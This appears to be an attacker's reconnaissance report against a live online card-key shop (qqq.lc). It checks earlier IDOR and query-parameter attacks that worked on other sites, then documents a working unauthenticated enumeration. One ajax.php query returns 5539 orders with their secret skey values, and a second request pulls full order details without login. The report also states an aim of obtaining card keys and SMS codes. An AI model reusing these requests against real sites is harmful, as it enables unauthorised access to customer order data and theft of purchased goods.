# SUCCESS_CASES → qqq.lc

Source: `/data/recon/exports/SUCCESS_CASES.md` (tested upfront)

| Case | Method | Result on qqq.lc |
|------|--------|------------------|
| **qd93.com** | `/?mod=query&data=` substring → faka | HTML always **302 → /user/login.php**. No storefront query page unauth. |
| **79yj / qq1234** | `api.php?act=search&id=` IDOR | `api.php` and `%61pi.php` → **404**. `ajax.php?act=search` → `No Act`. |
| **mima1314 / 15118** | YKFAKA `value=null` → `Query_Km` | **N/A** (rainbow, not YKFAKA). YK paths 404. |

**Directly reusable: none.**

## New finding (not in SUCCESS_CASES)

Unauthenticated **input-field order enum** via rainbow ajax:

1. `POST /ajax.php?act=query` with `querytype=1&qq=<input>`  
   - Exact match on `order.input`  
   - `qq=1` → **5539** orders, each with **`skey`**
2. `POST /ajax.php?act=order` with `id=<payorder>&skey=<skey>`  
   - Full order detail without login  
   - Wrong/missing skey → 验证失败

SMS delivery fields (`list` / `kminfo` / `result`) were **null** across sampled live + completed orders; **kami/SMS code not obtained**.
